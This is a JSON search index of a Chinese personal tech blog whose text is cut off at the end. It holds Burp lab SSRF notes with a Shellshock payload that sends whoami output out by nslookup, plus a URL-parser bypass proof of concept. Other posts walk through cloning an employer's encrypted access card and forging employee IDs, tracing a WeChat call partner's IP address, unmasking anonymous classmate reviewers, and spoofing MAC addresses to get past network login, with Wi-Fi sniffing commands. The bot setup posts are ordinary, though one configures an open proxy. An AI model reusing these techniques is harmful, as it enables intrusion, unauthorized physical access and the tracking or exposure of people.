[{"title":"Hello World","url":"/2025/05/02/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"burplab_ssrf","url":"/2025/03/13/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/burpsuite_lab/ssrf/","content":"burplab_ssrfreferer绕过可以在referer中加个dns查询\n双重url加密绕过如果存在类似url_decode()的函数就可以了\n特殊符号127.0.0.1 --&gt; 127.1\n\n省略前导零： 127.0.0.1  中的每个部分（127, 0, 0, 1）都可以省略前导零。因此， 127.0.0.1  可以简化为  127.0.1  或进一步简化为  127.1 \n解析器处理：大多数网络解析器（如操作系统的网络堆栈、Web 服务器等）在处理地址时，会自动补全省略的前导零。因此，当接收到  127.1  时，解析器会将其解释为\n通过可以跳转的功能点找到可能跳转路径的parameter找到可以跳转的元素之后,最好是放到支持POST的功能页面里面来执行\n\nGET找到parameter , 放到POST里面\n\nshellshock漏洞\n太鸡把强了SSRF盲打 &amp; Collaborator everywhere-CSDN博客\n\n使用Collaborator Everywhere自动挖洞burp插件\n安装完之后在target中发现对应的url，发送到Add to Scope在scope中勾选url就会开始挖洞,结果在target页面的issue中\n漏洞bash版本小于4.3\n可以使用shellshock漏洞\n原理\nroot@ubuntu:/# export name = &#x27;() &#123;echo &quot;Ling&quot;;&#125;&#x27;root@ubuntu:/# namebash: name: commond not foundroot@ubuntu:/# bashbash~4.3# namebash~4.3# Ling\n\n\n在 Bash 中一种独有的方法来定义函数 , 即 : 通过环境变量来定义函数\n当某个环境变量的值以字符串 “ () { “ 的格式作为开头, 那么该变量就会被当前 Bash 当作一个导出函数, 该函数仅会在当前 Bash 的子进程中生效 .\n导致漏洞出问题是以(){开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令\n\nHTTP中UA头一般保存在环境变量中POC\n() &#123; :; &#125;; /usr/bin/nslookup `whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net\n\n\nHTTP协议的头User-Agent通常是保存在环境变量HTTP_USER_AGENT的\nshellshock的payload：() { :; }; &#x2F;usr&#x2F;bin&#x2F;nslookup whoami.YOUR-SUBDOMAIN-HERE.burpcollaborator.net\nYOUR-SUBDOMAIN-HERE就是刚才Burp Collaborator client生成的域名，该payload可以将whoami的信息带外出来\n\n反扒措施检测referer头Referer头被探测的原因\n服务器对请求来源的验证与跟踪需求：服务器通常会检查Referer头来验证请求的来源是否合法，比如防止恶意请求从非授权的页面发起。同时，服务器端分析软件会根据Referer来统计页面的访问来源，了解用户是从哪些页面链接过来的，以便分析用户行为和网站流量路径。如果服务器在处理Referer头时存在漏洞，没有对其内容进行严格的过滤和验证，就可能导致它去访问Referer中指定的任意网址，包括内网地址，从而引发 SSRF 漏洞。\n\n携带User - Agent等信息的原因\n模拟正常请求行为：服务器在处理请求时，会将User - Agent等请求头信息作为请求的一部分来处理，以了解客户端的类型、操作系统、浏览器等信息，这有助于服务器根据不同的客户端情况返回合适的响应内容。当服务器访问Referer中的网址时，为了模拟正常的请求流程，通常会将原请求中的User - Agent等信息一并带上，就好像是客户端直接访问Referer中的网址一样。这样，被访问的目标网址（如果是存在漏洞的情况下）就可以根据这些信息来进一步处理请求，攻击者也可以利用这些信息来进行更精准的攻击或信息收集。\n\n服务器端分析软件不一定会转发整个 HTTP 请求包到Referer\n取决于服务器端的具体实现和漏洞情况：一般来说，服务器端分析软件可能只是提取Referer头中的网址，并尝试访问该网址以获取相关信息，不一定会完整地转发整个 HTTP 请求包。\n\n分析url语法分析器屏蔽的是什么东西过waf的思路\n逐个删除，发现一定需要保留可以被解析出来的urlstock.weliketoshop.net\n\nurl叠上加密,层层叠加,发现只能识别一层url,两层就无法识别了\n\n使用#来注释,url编码两次就能绕过,#经过两次url编码变成%2523\n\n路径后携带@可以被识别成重定向成@后面的,但是后端代码使用的库可能没有解析多层url的能力\n\n可以使用%2523@stock.weliketoshop.net来骗词法分析器以为定向到的就是目标url\n\nwww.baidu.com@www.bing.com定向到www.bing.com\n\nwww.baidu.com#@www.bing.com后面被注释,定向到www.baidu.com\n\nwww.baidu.com@www.bing.com/admin访问的是www.bing.com/admin\n\nwww.baidu.com#@www.bing.com/admin访问的是www.baidu.com/admin\n\n\n\nPOChttp://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos\n\n\n\n绕过waf的其他思路文章关于SSRF和多种绕过方式 - FreeBuf网络安全行业门户\n","categories":["打靶日记","burpsuitelab"],"tags":["ssrf"]},{"title":"关于NFC的一些探究","url":"/2023/11/20/%E6%8A%80%E6%9C%AF/NFC/","content":"前情提要工作中常会用到单位的门禁卡，但是由于仅此一张，又是加密卡无法直接用手机复制，于是托大佬搞来了读卡器和变色龙(Chameleon Mini pm8)。\n那就搞搞首要任务吧，复制复制这张加密卡！\n啥都不会 先学理论变色龙\n变色龙侦测卡，也称为Chameleon Mini，是一个开源产品，其大小稍大于一般的信用卡。这款侦测卡的主要功能是模拟被动NFC设备和非接触式IC卡，充当有源NFC设备如RFID读取器，以及嗅探和登录通信。它可以完全复制许多商业非接触式智能卡包括UID卡在内的全部内容，因此常用于测试RFID和NFC设备在各种攻击环境下的安全性。\n\n读卡器这个就不用多说了，就是读卡号，写卡，格式化卡，改卡\n各种相关的卡片ID卡\nID卡没有算法，不可写入数据，其ID出厂一次性写入，应用人员只可读出卡号加以利用 ，ID卡容易复制，安全性较低。\n\nIC卡\nIC卡是智能卡的总称， IC卡带有存储器可读写，普通的IC卡也叫储存器卡、逻辑加密卡。IC卡数据的读取,写入均相应的密码认证, 数据可以分区，不同区用于不同的功能，可以有不同的密码保护。IC卡所记录内容可反复擦写，分为接触式和非接触式IC卡。  \n\n看着有点麻烦，再看看\nCPU卡没有下手的可能\n算法相关算法有很多，但是引起大佬注意的不多\n滚动码\n每次进行正确的刷卡行为都会改动卡片本身数据；倘若系统检测到卡片数据有误，做人的系统就会禁止这次行为；不做人的系统就会拉黑这张卡，也就是说除非联系管理员，否则就会得到一张废卡\n\n这个是最大的威胁，开始我以为是是要接触读卡机就会改变数据，后来发现是只有和终端正确响应才能能够进行数据交互\n挑战响应机制有点复杂看不太懂\n\n知乎CSDN\n\n上手实操（相当简单）\n读卡器读原卡号导入变色龙\n变色龙解码拿到解密文件\n导入解密文件开始解码\n解码完得到dump文件\n\n\n（以上可以复制完了，接下来是导入手机）5. 手机复制卡号（由于机制保密问题，手机一旦识别到加密区就会自动停止复制，可能在root机型上可以复制，但未探究）6. 然后将手机放在读卡器上导入dump文件进行m1写卡\n出现的问题及反思1. 变色龙的使用变色龙的嗅探功能：随便都可以进行嗅探，可以不用提前导入卡号，就可以得到设备的加密方式（字符串），但是返回解码的密码并不能够对原卡进行解码。本次样本中正确的密码应该是原卡卡号+加密方式（字符串）。\n变色龙的模拟功能需要导入dump文件，并且可以导入多达8个，可以模拟各种卡，并且可以对卡文件进行随意改动而不会影响硬件。\n变色龙的随机卡号功能random UID可以随机模拟卡号，按一下变一下\n其他然而事实上变色龙并不能取代读卡器的功能，也就是说变色龙不能够单独使用\n2. 卡片\n读卡后一声为低频卡（ID）\n读卡后两声为高频卡（除了ID卡的其他卡）\n大佬介绍存在一种卡读卡的时候完全没有反应\nUID卡手动改动0扇区卡号后读卡的时候也完全没反应，也就是说正常使用UID卡不能够手动改变0扇区，但是却可以导入dump文件对卡号进行修改，相当奇怪。\n\n3. Dump文件dump文件采用16进制的编码形式解码后导入dump文件重新写卡得到的也是加密卡dump文件中初始六位为卡号，会等同于某一特定扇区的初始6位\n4. 进一步探究\n我们发现刷卡到开门只需要不到一秒的时间，但是即使我们通过嗅探得到的秘钥在解码时电脑上了性能模式，也足足解码了17分钟。那么基本可以断定在进行交互的时候，门禁终端并没有解码所有扇区，而是仅仅解码某一特定扇区。\n原卡中的某一特定扇区中有明确的工号，而在工号的前面是有字符串转十六进制的八位字符。但是在后边控制变量的时候，我们发现只有工号和卡号有用，其余部分没有作用。\n0扇区和这个特定扇区卡号必须一致，否则就会导致无法读卡。\n通过单位内部人员名单发现工号位数一直形式相似，基本可以判断这个区块的判断方式就是工号。\n单位内的工号分为人员工号和部门工号\n如果只改变工号，在特定的部门里会显示“未授权”，然而更多的部门会显示“数据错误”。\n所有设备嗅探得到的加密方式完全一致\n\n5. 小遗憾\n在发现工号和卡上内容的联系后，我们就萌生了有工号刷遍全单位的想法，然而随着进一步探究基本确定了卡号和工号的绑定。然后由于样本有限，我们无法推断两者间的加密方式或者是随机发卡模式。\n未能搞清楚门禁系统返回“未授权”，“数据错误”的具体原因。猜测系统分为两步验证：\n\n\n首先验证卡号是否授权，否，返回“未授权”；\n是，进一步检验卡号，返回“数据错误”。\n\n特别鸣谢感谢大佬在这次行动中全程带我起飞，但由于不可抗力因素，无法实名感谢🌹\n","categories":["技术"],"tags":["NFC"]},{"title":"火绒剑抓微信包","url":"/2024/01/17/%E6%8A%80%E6%9C%AF/%E7%81%AB%E7%BB%92%E5%89%91/","content":"前提微信语音通话使用UPD协议，在接通的时候会暴露彼此ip地址，通过火绒剑可以对对方的ip地址进行跟踪。\n下载火绒剑下载，密码：52pj；\n细节\n在火绒的安全工具中找到火绒剑并且打开；\n在进程中找到WeChat的“进程ID”；\n在系统-过滤-进程过滤中添加进程；\n下拉方法，将映像路径改成进程ID；\n\n\n\n\n设置动作过滤，只保留MT_netmon选项\n\n细节\n不是在网络中进行；\n需要在接通电话后稍等一下才会出现；\n用于微信通话的端口不会是常见的端口，一定是比较奇怪的端口；\n作为UPD协议会一直改变端口传输，并且各个端口多半是连接在一起的；\nIP定位并不能得到一个准确的位置，最多就只能精准到半径8km。\n常用IP定位网站\n\n","categories":["技术"],"tags":["技术"]},{"title":"是谁偷偷给我打了满分？","url":"/2023/12/25/%E5%AD%A6%E6%A0%A1/%E8%84%9A%E6%9C%AC/%E6%98%AF%E8%B0%81%E7%BB%99%E6%88%91%E5%81%B7%E5%81%B7%E6%89%93%E4%BA%86100%E5%88%86/","content":"是谁偷偷给我打了满分？前情提要部分学校设置的优学院学生互评机制给了一些“不法分子”趁虚而入的机会，常常会对毫不相干的同学下手。具体表现为作业看都不看一眼直接给满分，这种行为我们要给予坚决抵制，并且要揪出到底是谁！\n应用软件edge 油猴插件 脚本 burp\n技术细节1. 丐版操作（不能直接抓人）\n下载[已失效]的脚本（链接在上面了）；\n下载成功之后我们进入优学院已经学生互评过的页面，就可以看见互评人了；\nuserID就是目标同学的唯一ID了；\n开始翻找舍友的ID，这么多次互评总有一次被舍友评到或者评到舍友吧doge；\n局限性：不能够看到自己的ID，无法直接抓人，要通过社工大法间接求援。\n\n2.进阶版（直接抓人）宇宙声明：本人由于技术太差，只说大概不说具体原理和步骤名称（距离产生美）\n\nproxy打开浏览器\n登录优学院账号直到打开相关科目的作业详情；\n打开HTTP history逐个点击，可以找到自己的userID，这个是和学号高度相关的，自己在班级学号中的位置就是在userID中的排序；\n在本地新建一个Excel文档拉一下对比花名册就可以得到所有人的学号姓名对应userID。\n\n新版本可以直接看到互评同学的的姓名，学号，班级油猴插件\n","categories":["脚本","学校"],"tags":["脚本"]},{"title":"mac 地址利用和修改","url":"/2024/02/02/%E6%8A%80%E6%9C%AF/mac/","content":"前提许多的网络环境都会进行设备验证，从而二次免验证或者是防止 ARP 攻击来保证内网环境的安全。然而，在这套机制使用的同时也会造成问题。本文将从 mac 地址的使用逻辑和对于不同平台 mac 地址的修改进行探讨。\nmac查询方法\nwindows平台 win+r输入cmd在终端中输入 ipconfig /all\n安卓平台（以荣耀为例） 随意连上任何一个WiFi后在设置-WLAN中打开已经连接的WLAN就可以看到本机的mac。\n\n走近mac\n在一些需要验证的网络环境中，正常用户登录验证以后会有 DHCP 进行分配 ip 地址，同时将 mac 地址和对应账户进行绑定。当我们访问无密码保护但需要登录验证的网络时，如果抓到了 ARP 包，通过修改本机 mac 地址而不用修改 ip 地址的方法就可以成功免登录连接网络进入内网环境；在实际操作中可以观察到，如果更改 mac 的设备是使用有线连接而被获取 mac 的设备是通过无线连接，那么无线设备并不能够接入网络。相当于 IP 冲突了。\n在进行网络搭建的时候，对于固定资产，有一种解决方案是使用静态并且对 IP+mac 进行绑定，那么只要是接入设备改成了与之一致的 IP 和 mac 的话，那么无论是什么平台，都可以获得与源主机一致的内网权限来访问内网资源。\n如果是由于不恰当操作导致设备 mac 遭到服务器的封禁而无法连接网络，一般来说通过修改 mac 的方式也可以重新连接进入网络。\n\nmac获取方法1\n此操作无需连接到目标热点此操作需要具有 monitor 的网卡，一般是外置网卡（淘宝可以搜到一大堆），并且是全程在 kali（有root权限） 中进行的操作。操作大概是：扫描附近WiFi-选择想要获取mac-监听WiFi信号\n\n扫描附件的Wifi打开终端查看网卡是否支持监听\nairmon-ng\n(ps:对于终端字体太小可以 shift和ctrl和+ 进行放大，CTRL和-进行缩小)\n\n可以看到我这里有两个支持 moniter 的网卡\n选择一个网卡开启监听功能，这里选择 wlan0\nairmon-ng start wlan0\n\n要注意开启监听以后网卡的名字可能更改为wlanxmon，具体需要查看\nifconfig\n\n可以看到，这里的网卡名称改变了，但是有些设备并不会更改名称，要依据实际\n\n扫描附近的热点\nairodump-ng wlan0mon\n\n当目标 WiFi 的名称出现的时候，“CTRL+c”暂停扫描，否则无法保存和复制对于的热点信息\n\n需要记录的是目标热点的 BBSSID(mac) 和 CH(信道) \n监听目标热点输入嗅探握手包命令\n\n此操作不仅可以查找到目标热点下所连接的设备 mac ，还主要是可以获得握手包，可能存在着加密的WiFi密码，在此不与探讨\n\nairodump-ng -c &lt;目标WiFi的信道&gt; --bssid &lt;目标BSSID&gt; -w &lt;储存握手包的文件名不需要文件格式&gt; &lt;网卡名称&gt;\n(ps:命令中不需要“&lt;”,“&gt;”,linux中复制粘贴是“shift+ctrl+c”和”shift+ctrl+v”)稍等片刻便可以看到连接着热点的设备的 mac\n\nmac获取方法2\n此操作需要连接到目标热点\n\nnmap -sn 192.168.3.1/24\n\n已知IP时的 mac 获取方法\n此操作需要连接到目标热点\n\nLinuxarp 目标IParping 目标IP\narp 命令与 arping 命令存在本质区别。\n\narp 命令是通过查询 arp 映射表，如果表中没有，就会直接返回no entry；如果表中有，即使网络中并不存在该设备，也能够返回表中的东西。arp 表的增删改替是通过 ping 这个操作来进行的。ping 成功了，表中就添加，ping 失败了，表中就删除\narping 命令则是直接发送 arp 包，只要网络中存在该设备，就一定会返回设备的 mac，无论表中有没有。\n\nmac修改方法分类1. 硬改该方法不需要获得软件上的很高的权限，只需要直接修改硬件网卡的 mac 参数，对于安卓手机来说体现为不需要获得 root 权限，但是需要对系统重新修改来适应新的 mac 地址。此操作就相当于是更换了一个全新的网卡，对于安卓设备来说，硬改 mac 以后通常会格式化系统。\n2. 软改系统要调用硬件需要经过内核或者是驱动，那么在驱动层面会对网卡 mac 有一个记录，如果修改这个记录，那么就可以在驱动层面对网卡的mac进行修改达成目的。此项操作一般需要比较高的权限，在安卓手机表现为需要拿到root权限，windows平台表现为需要有管理员权限。需要注意的是：对于realtek品牌的网卡来说，网卡的缓存区是只可以写入而不可以擦除的，这也就意味着realtek的网卡 mac 修改有次数限制，而具体的修改次数则需要看对应具体的网卡。\n修改方法（只限于软改）1. 对于近三年来的绝大多数设备（包括 windows ）直接在 WLAN 设置中找到随机 mac 的选项，打开后便可以修改随机 mac，但局限于不能指定修改 mac ；\n2. 对于取得 root 权限的安卓设备2.1 软件辅助最简单的便是安装有 nethunter 的设备，需要在配套的F-Droid中安装Nexmon，在 nethunter 主页中直接就有修改 mac 的选项，可以选择是随机产生 mac，也可以指定修改 mac ；注意如果没有安装Nexmon则会被限制修mac，即必须符合国际mac修改标准；  \n2.2 修改系统文件先打开飞行模式，使用MT管理器或ES文件浏览器等可以申请并且以及获得超级管理员权限（root 权限）的应用打开一下文件\n\\data\\nvram\\APCFG\\APRDEB\n并修改其中的WIFI文件，按照里面的数据格式改成想要的 mac 地址，之后关闭飞行模式或者重启手机即可。\n3. 对于 windows 平台3.1 设备管理器修改法此方法使用的前提是网卡的自带驱动上带了相关的修改接口打开控制面板→设备管理器→网络适配器→对应网卡→属性\n\n在高级选项中找到 Network Address&#x2F;MAC Address&#x2F;网络地址 在设备管理器对网卡mac进行修改\n3.2 注册表修改法此方法为万能方法，但是需要注意前文提及的realtek网卡的限制win+r 并输入 regedit 打开注册表，并定位到\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\&#123;4D36E972-E325-11CE-BFC1-08002bE10318&#125;\n每一个00xx都代表着一个网卡，但是需要注意的是，一般来说只有一个是真实网卡，其他都是虚拟网卡，具体就需要进入各个项目看看是否有标明对应的网卡型号。\n\n找到物理网卡以后，需要在这个网卡的项目中新建一个字符串，命名为 NetworkAdress ，值就是新的 mac \n\n点击确定后重启网卡或者直接重启电脑再看看 mac 是否修改成功。介绍通过 cmd 命令来查看和重启网卡：\n\n首先进入cmd终端 win+r 键入 cmd ，命令行输入\n\nnetsh interface show interface\n此时就可以看到所有的网卡\n接着关闭网卡\nnetsh interface set interface &quot;要操作的网卡名称&quot; disable\n启动网卡\nnetsh interface set interface &quot;要操作的网卡名称&quot; enable\n通过一开一关即可对网卡实现重启如果有问题就需要用管理员权限打开cmd\n3.2 对于部分系统版本可以安装软媒魔方，通过软件来对mac进行修改，但是我没能成功复现\n逆天改法：修改路由器 mac连接路由器的 windows 平台上打开 cmd 输入\nipconfig\n查看本机的 IPv4 地址。一般来说路由器的管理 ipv4 地址都是与本机地址在同网段的 1 号\n\n可以看到本机 ipv4 地址为 192.168.3.17 那么可以推测路由器管理地址为 192.168.3.1\n在浏览器输入 192.168.3.1 输入管理密码进入路由器后台\n\n在“我要上网”中找到上网方式，选择MAC克隆-手动输入 MAC 地址来达成修改 MAC 地址的目的。\nIP获取方式\n前提必须是能够连接目标热点\n\nWindows一般来说已知 mac 是无法获取对应IP的，但是在居于网中通过 arp 可以通过映射关系用 mac 查询到对应设备的IP地址。先 ping 一下获得更多数据后查找 arp 包。先同样是打开cmd，批量ping局域网内ip\n#批量ping局域网内网段for /L %i IN (1,1,254) DO ping -w 2 -n 1 10.8.1.%i\n\n批量ping网段命令语法\nfor /L %variable in (start,step,end) do command [command-parameters]\nvariable变量名 | start开始 | step步长 | end结束 | command命令 | command-parameters命令参数\nfor /L %d in (1,1,255) do ping 192.168.0.%d &gt;&gt; C:\\Users\\XXX\\Desktop\\a.txt\n&gt;&gt;为重定向符号，将代码执行结果保存到文件路径为 C:\\Users\\XXX\\Desktop 的a.txt文件\n\n#查 arp 表arp -a\n就可以看到对应的 mac 和 IP 的对应关系。\n可以轻易发现：ping之后的arp表会比ping之前的arp表所含有的数据更多\nLinux扫描 10.8.1.0网段\nnmap -sn 10.8.1.0/24 ##发现mac\n通过 arp 映射表查看\ncat /proc/net/arp\nwireshark过滤定向查找IP在过滤中输入\neth.arrd == MAC地址\n可以在数据包中找到对应的IP\n","categories":["技术"],"tags":["技术"]},{"title":"微信机器人","url":"/2024/01/13/%E6%8A%80%E6%9C%AF/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E9%A1%B9%E7%9B%AE/GEMINI/","content":"前提\n复现b站大佬“技术爬爬虾”按照GitHub开源项目“chatgpt-on-wechat”的项目。该项目利用的是微信的官方接口接入最时髦的谷歌机器人GEMINI，不存在任何的账号风险。B站大佬项目地址：https://www.bilibili.com/read/cv29550040/GitHub项目地址：https://github.com/zhayujie/chatgpt-on-wechat\n\n环境声明\n本次复现实验使用的服务器有：华为云提供的云函数（不用钱）（用于企业微信应用中&lt;网页授权及JS-SDK&gt;验证）以及阿里云提供的轻量应用服务器（[亚太-新加坡-包年-学生优惠&#x3D;免费](轻量应用服务器 (aliyun.com))）（用于部署主体docker转发提供AI服务的服务器和企业微信机器人之间的流量）\nUbuntu22.04\ndocker version 24.0.7\n\n复现过程困难\n在验证&lt;网页授权及JS-SDK&gt;时候的出现验证失败的问题： 1.1 在选择云函数实例的时候需要选择北京的服务器，如果选择其他地区的服务器则会出现下一步校验可信域名的时候找不到相关的代码区； 1.2 需要先点击申请校验域名后下载文件，用文本打开文件后复制到华为云函数中的代码中后才可以进行确定（只有在这个时候才会真正地开始校验）；\n\n最后一设置api接收的时候一直出现api回调地址请求不通过，是由于服务器没有开放9898端口，这是阿里云做的整体防护，不能够直接在服务器系统上进行端口开放，需要在阿里云服务器-轻量应用服务器中的防火墙中手动打开9898端口,具体操作为：轻量应用服务器-小盾牌图标-防火墙-管理规则-添加规则。\n\n\n\nB站大佬原文这不是普通微信好友，这是我的家族企业微信，我们点进去看看，其实里面就我一个活人，其他都是AI机器人。这些机器人对接了各类AI大模型，甚至还提供电影下载，智能家居等服务。这些机器人使用的是微信的官方接口，不会对微信账号带来任何风险。并且微信天然支持语音图片输入，能承接AI的多模态功能。所以使用企业微信对接AI机器人，是一个非常好的解决方案。  本期我来分享下如何免费注册一个人的企业，白嫖企业微信的全部功能。企业微信设置繁琐，内容十分硬核，建议收藏多看几遍，视频制作不易希望各位观众老爷点赞支持下。  \n项目主页：https://github.com/zhayujie/chatgpt-on-wechat项目文档；https://docs.link-ai.tech/cow/quick-start本教程没讲到的细节请参考文档。  \n\n注册企业微信https://work.weixin.qq.com/wework_admin/register_wx?from=loginpage  \n\n创建企业机器人应用管理–&gt;应用–&gt;创建应用 ，应用名称跟描述随便填,可见范围选整个公司这样就创建好了一个企业机器人。\n\n\n\n\n配置可信域名如果未认证的企业可以使用华为云的域名，认证企业则必须\n\n3.1. 登陆华为云  https://activity.huaweicloud.com/ ，完成实名认证\n3.2. 创建云函数搜索云函数，点击立即使用。右上角创建函数，选择HTTP函数，函数名称随便填。\n\n3.3. 创建触发器切换到设置 触发器-创建触发器\n\n安全认证选None ，分组随意创建一个 \n\n3.4. 获得URL\n\n下一步 打开企业微信 –&gt;进入刚才创建的机器人–&gt;设置可信域名\n\n可信域名填3.4步骤中的URL，类似以下格式（注意去掉http:&#x2F;&#x2F; 与 最后的&#x2F;）\n5d1c0cceabb04d8e8413c2b615790846.apig.cn-north-1.huaweicloudapis.com\n3.5. 获得乱码点击申请校验域名-&gt;下载文件, 将文件里面的乱码复制下来  大约长这样： 1tg27Cpi9hYTjFFq \n\n3.6. 绑定可信域名回到华为云，  代码-&gt;index.js 修改第九行为文件里的乱码（见3.5小节获得的乱码），点击部署 \n\n部署完成 回到企业微信-&gt;点击确定  可信域名即完成绑定\n\nGemini对接企业微信\n\n我们使用这个项目  chatgpt-on-wechat\nhttps://github.com/zhayujie/chatgpt-on-wechat\n4.1. 申请Google Gemini申请一个API key\nhttps://makersuite.google.com/app/apikey\n4.2. ubuntu系统安装docker找一个国外IP的服务器，先安装docker ，下面脚本已ubuntu为例\nsudo apt updatesudo apt-get install ca-certificates curl gnupg lsb-release software-properties-commoncurl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;sudo apt-get install docker-ce docker-ce-cli containerd.io \n4.3. 下载docker compose执行以下命令下载 docker-compose.yml：\nwget https://open-1317903499.cos.ap-guangzhou.myqcloud.com/docker-compose.yml\n修改docker compose文件，主要配置从24行以下开始 \nversion: &#x27;2.0&#x27;services:  chatgpt-on-wechat:    image: zhayujie/chatgpt-on-wechat    container_name: chatgpt-on-wechat    security_opt:      - seccomp:unconfined    environment:      OPEN_AI_API_KEY: &#x27;YOUR KEY&#x27;      PROXY: &#x27;&#x27;      SINGLE_CHAT_PREFIX: &#x27;[&quot;bot&quot;, &quot;@bot&quot;]&#x27;      SINGLE_CHAT_REPLY_PREFIX: &#x27;&quot;[bot] &quot;&#x27;      GROUP_CHAT_PREFIX: &#x27;[&quot;@bot&quot;]&#x27;      GROUP_NAME_WHITE_LIST: &#x27;[&quot;测试群&quot;, &quot;测试群2&quot;]&#x27;      IMAGE_CREATE_PREFIX: &#x27;[&quot;画&quot;, &quot;看&quot;, &quot;找&quot;]&#x27;      CONVERSATION_MAX_TOKENS: 1000      SPEECH_RECOGNITION: &#x27;False&#x27;      CHARACTER_DESC: &#x27;你是Gemini, 你旨在回答并解决人们的任何问题&#x27;      EXPIRES_IN_SECONDS: 3600      USE_GLOBAL_PLUGIN_CONFIG: &#x27;True&#x27;      USE_LINKAI: &#x27;False&#x27;      LINKAI_API_KEY: &#x27;&#x27;      LINKAI_APP_CODE: &#x27;&#x27;      ## 配置从以下开始      MODEL: &#x27;gemini&#x27;      # 4.1小节申请的 gemini api key      GEMINI_API_KEY: &#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;      CHANNEL_TYPE: &quot;wechatcom_app&quot;      # 企业微信-&gt;我的企业-&gt;企业ID      WECHATCOM_CORP_ID: &quot;xxxxxxxxxxxxxxxxxx&quot;      # 企业微信-&gt;应用管理-&gt;应用-&gt;Secret      WECHATCOMAPP_SECRET: &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;      # 企业微信-&gt;应用管理-&gt;应用-&gt;AgentId      WECHATCOMAPP_AGENT_ID: &quot;xxxxxx&quot;      # 企业微信-&gt;应用管理-&gt;应用-&gt;接收消息-&gt;设置API接收-&gt;Token      WECHATCOMAPP_TOKEN: &quot;xxxxxxxxxxxxxxxxxxxxxxxxxx&quot;      # 企业微信-&gt;应用管理-&gt;应用-&gt;接收消息-&gt;设置API接收-&gt;EncodingAESKey      WECHATCOMAPP_AES_KEY: &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;      WECHATCOMAPP_PORT&quot;: 9898    ports:      - 9898:9898 \n4.4. 启动docker修改完成后将docker启动起来\n# 启动dockersudo docker compose up -d# 查看日志sudo docker logs  chatgpt-on-wechat# 停止docker 如果修改配置文件必须先停止再启动# sudo docker compose down\n启动完成后安装Gimini依赖\n# 获取所有执行中的容器sudo docker ps# 在置顶容器安装 google-generativeai，注意修改xxxxxxxx为容器IDsudo docker exec xxxxxxxxxx pip3 install google-generativeai# 重启容器sudo docker restart xxxxxxxxxx\n4.5. 企业微信设置回到企业微信，填写好URL  ,按如下格式  \nhttp:&#x2F;&#x2F;服务器IP:9898&#x2F;wxcomapp\n注意Token与EncodingAESKey与docker配置一致。\n点击企业可信IP，填入服务器的公网IP\n\n4.6. 微信加入企业我的企业-&gt;微信插件-&gt;邀请关注 ，使用微信扫码即加入企业，然后就可以开始应用机器人\n","categories":["技术","企业微信项目"],"tags":["wechat-ai"]},{"title":"python中API发送自建应用消息","url":"/2024/10/04/%E6%8A%80%E6%9C%AF/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E9%A1%B9%E7%9B%AE/pythonWXWapi/","content":"参考文档\ncorpwechatbot: https://github.com/GentleCP/corpwechatbot官方文档: https://developer.work.weixin.qq.com/document/path/90930疑似官方源码: https://github.com/sbzhu/weworkapi_python\n\n说明本文是基于python后端来调用企业微信API向用户微信发送消息的复现过程, 主要解决了以下问题:  \n\n解决回调配置中出现openapi回调地址请求不通过（自建应用 - 接收消息 - 设置API接收）\n设置代理服务器\n设置可信域名\n发送消息\n本文的食用前提：已有企业微信，已初始化一个自建应用\n\n开搞设置API接收\n官方文档提供了基于内网穿透的本地调试工具： 链接\n\n\n初始化服务器python环境  \n python -m venv WXWorkAPI\n拷贝代码: 链接 &#x2F; 下载代码\n\n在企业微信后台进入应用管理，选择一个应用，找到接收消息\n\n设置API接收消息的三个选项，如下\n\n参考corpwechatbot-web (github.com)，在服务器上运行web.py  \n python3 web.py -p=8000 -t=&quot;token&quot; -a=&quot;aeskey&quot; -c=&quot;corpid&quot;\n 确认你的web服务成功启动，并能通过公网访问  \n\n点击保存，如果正常，会提示API设置成功，记住这些配置信息\n\n这样就完成了url的配置,但是需要注意的是,以后所有的数据都需要从这个设置的端口中出入, 所以需要设置代理服务器, 让所有的数据都经过这里, 但是web.py会自己去使用端口,就会导致直接发送消息时出现端口占用的现象。\n\n大佬的web.py中还配置了自动回复，触发关键词为“我帅吗”\n\n\n设置代理服务器本文使用的代理服务器是squid, 可以支持全局代理, 但是此处并不需要, 只需要能够让指定端口实现转发数据来达成自建应用的所有数据都从特定端口出入的目的\n\n安装squid\n sudo apt updatesudo apt install squid\n配置squid\n sudo nano /etc/squid/squid.conf#修改监听端口： 默认 Squid 会监听在端口 3128 上，你可以更改这个端口。例如，如果要监听在 123 端口上：http_port #允许所有 IP 地址访问： 默认情况下，Squid 只允许本地机器访问。如果你想允许所有 IP 地址访问 Squid 代理，可以取消注释以下行或添加新的行acl all src 0.0.0.0/0    # Allow all IP addresseshttp_access allow all#如果你只想允许特定的 IP 地址访问，可以这样配置：acl localnet src 192.168.1.0/24     # Allow local networkhttp_access allow localnet\n启动并设置自启\n sudo systemctl start squidsudo systemctl enable squid\n\n检查状态\n systemctl status squid\n\n端口冲突 如果出现端口冲突的时候，停用squid\n sudo systemctl stop squid\n\n设置可信域名找到对应的路径，输入ip注意不需要端口，只需要ip\n发送消息\n配置环境\n source /to/path/bin/activatepip install -U corpwechatbot\n配置测试消息 该推送会直接传至你的个人微信上，你会像收到好友消息一样收到通知信息，你需要先初始化一个AppMsgSender实例对象，如下：\n import cptoolsfrom corpwechatbot.app import AppMsgSender# from corpwehcatbot import AppMsgSender  # both will workapp = AppMsgSender(corpid=&#x27;&#x27;,  # 你的企业id                